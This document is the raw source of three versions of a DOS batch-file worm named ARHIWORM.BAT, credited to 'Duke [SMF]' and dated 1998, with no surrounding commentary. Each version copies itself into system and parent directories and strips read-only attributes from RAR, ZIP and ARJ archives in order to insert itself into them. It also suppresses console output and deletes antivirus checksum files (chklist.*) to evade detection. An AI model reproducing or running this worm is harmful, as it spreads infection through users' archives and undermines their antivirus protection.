@echo off
if "%1"=="#r#" goto rar
if "%1"=="#z#" goto zip
if "%1"=="#a#" goto arj
ctty nul
copy %0 c:\dos\%0
copy %0 c:\windows\%0
copy %0 c:\win95\%0
copy %0 c:\%0
copy %0 ..\%0
ctty con
for %%r in (*.rar) do call %0 #r# %%r
for %%z in (*.zip) do call %0 #z# %%z
for %%a in (*.arj) do call %0 #a# %%a
ctty nul
del chklist.*
ctty con
goto end
:rar
attrib -r %2
rar a -tk -y -c- -o+ %2 %0 >nul
goto end
:zip
attrib -r %2
pkzip %2 %0 >nul
goto end
:arj
attrib -r %2
arj a %2 %0 >nul
:end
echo on
@rem ARHIWORM.BAT v2.x - file's worm  (c) by Duke [SMF] 9.06.98
===== Cut here =====

===== Cut here ===== start BAT.ArhiWorm v2.0
@ctty nul
if "%1"=="-rar" goto rar
if "%1"=="-zip" goto zip
if "%1"=="-arj" goto arj
copy %0 c:\dos\%0
copy %0 c:\windows\%0
copy %0 c:\win95\%0
copy %0 c:\%0
copy %0 ..\%0
for %%r in (*.rar) do call %0 -rar %%r
for %%z in (*.zip) do call %0 -zip %%z
for %%a in (*.arj) do call %0 -arj %%a
del chklist.*
goto end
:rar
attrib -r %2
rar a -tk -y -c- -o+ %2 %0
goto end
:zip
attrib -r %2
pkzip -m %2 %0
goto end
:arj
attrib -r %2
arj a -d %2 %0
:end
ctty con
@rem ARHIWORM.BAT v2.0 - files worm  (c) by Duke [SMF] 9.06.98
===== Cut here =====

===== Cut here ===== start BAT.ArhiWorm v2.1
@echo off
if "%1=="#r goto rar
if "%1=="#z goto zip
if "%1=="#a goto arj
ctty nul
copy %0 c:\dos\%0
copy %0 c:\windows\%0
copy %0 c:\win95\%0
copy %0 c:\%0
copy %0 ..\%0
del chklist.*
ctty con
for %%r in (*.rar) do call %0 #r %%r
for %%z in (*.zip) do call %0 #z %%z
for %%a in (*.arj) do call %0 #a %%a
goto end
:rar
attrib -r %2
rar a -tk -y -c- -o+ %2 %0 >nul
goto end
:zip
attrib -r %2
pkzip %2 %0 >nul
goto end
:arj
attrib -r %2
arj a %2 %0 >nul
:end
rem ARHIWORM.BAT v2.1 - file's worm  (c) by Duke [SMF] 9.06.98
echo on
===== Cut here =====
